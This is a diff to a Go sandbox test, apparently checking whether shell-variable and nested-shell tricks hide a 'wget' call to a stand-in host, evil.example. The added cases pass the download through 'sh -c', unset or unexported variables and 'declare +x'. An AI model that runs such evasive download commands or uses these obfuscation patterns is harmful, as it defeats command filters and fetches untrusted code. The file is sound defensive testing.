@@ -558,6 +558,9 @@ func TestSandboxExecStdinReadsShellCodeAndTheExecsVariables(t *testing.T) {
 				{nil, "sh -c \"sh -c 'c=wget; \\$c https://evil.example/x'\" </dev/null\n"},
 				{nil, "sh -c \"bash -c \\\"sh -c 'c=wget; \\\\\\$c https://evil.example/x'\\\"\" </dev/null\n"},
 				// A child shell does not get a variable the script did not export.
+				{nil, "export c=echo\nunset c\nc=echo\nsh -c '$c wget https://evil.example/x' </dev/null\n"},
+				{[]string{"c=echo"}, "unset c\nc=echo\nsh -c '$c wget https://evil.example/x' </dev/null\n"},
+				{nil, "export c=echo; declare +x c\nsh -c '$c wget https://evil.example/x' </dev/null\n"},
 				{nil, "c=echo; sh -c '$c wget https://evil.example/x' </dev/null\n"},
 				{nil, "c=echo\nsh -c '$c wget https://evil.example/x' </dev/null\n"},
 				{nil, "c=echo\nbash -c '$c wget https://evil.example/x' </dev/null\n"},
